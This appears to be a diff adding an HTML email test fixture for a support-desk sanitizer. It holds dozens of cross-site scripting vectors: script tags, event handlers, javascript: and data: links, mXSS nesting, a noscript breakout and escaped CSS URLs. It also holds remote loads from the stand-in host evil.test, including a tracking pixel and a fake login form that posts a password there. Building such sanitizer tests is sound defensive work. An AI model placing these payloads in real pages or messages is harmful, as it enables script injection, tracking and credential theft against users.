@@ -1,0 +1,40 @@
+From: "Mallory" <mallory@customer.test>
+To: support@acme.test
+Subject: Please look at my invoice
+Message-ID: <xss-1@customer.test>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head>
+<base href="https://evil.test/">
+<meta http-equiv="refresh" content="0;url=https://evil.test/refresh">
+<link rel="stylesheet" href="https://evil.test/style.css">
+<style>body { background: url(https://evil.test/style-bg.png); } @import url(https://evil.test/import.css);</style>
+<script>top.__xss = "head-script";</script>
+</head>
+<body onload="top.__xss='body-onload'">
+<p id="safe">XSS-SAFE-MARKER: my <b>invoice</b> is <i>wrong</i>.</p>
+<script>top.__xss = "script"; parent.__xss = "script"; window.__xss = "script";</script>
+<img src="x" onerror="top.__xss='img-onerror'">
+<img src="https://evil.test/pixel.png" alt="tracking pixel" width="1" height="1">
+<img src="//evil.test/protocol-relative.png" alt="relative">
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+" alt="svg">
+<svg onload="top.__xss='svg-onload'"><circle r="5"/></svg>
+<a href="javascript:top.__xss='js-link'">click me</a>
+<a href="https://example.test/help" target="_self" rel="opener">a normal link</a>
+<a href="data:text/html,<script>top.__xss='data-link'</script>">data link</a>
+<iframe src="https://evil.test/frame"></iframe>
+<iframe srcdoc="<script>top.__xss='srcdoc'</script>"></iframe>
+<object data="https://evil.test/object.swf"></object>
+<embed src="https://evil.test/embed.swf">
+<form action="https://evil.test/phish" method="post"><input name="password" type="password"><button>Log in</button></form>
+<div style="background-image: url('https://evil.test/inline-bg.png')">styled with a remote background</div>
+<div style="background: u\72l(https://evil.test/escaped.png)">escaped url</div>
+<p style="color: red; font-weight: bold">red text stays</p>
+<math><mtext><table><mglyph><style><img src=x onerror="top.__xss='mxss'"></style></mglyph></table></mtext></math>
+<noscript><p title="</noscript><img src=x onerror=top.__xss='noscript'>"></p></noscript>
+<details open ontoggle="top.__xss='ontoggle'"><summary>details</summary></details>
+<video src="https://evil.test/video.mp4" poster="https://evil.test/poster.png"></video>
+<audio src="https://evil.test/audio.mp3"></audio>
+<table background="https://evil.test/table-bg.png"><tr><td background="https://evil.test/td-bg.png">cell</td></tr></table>
+</body></html>
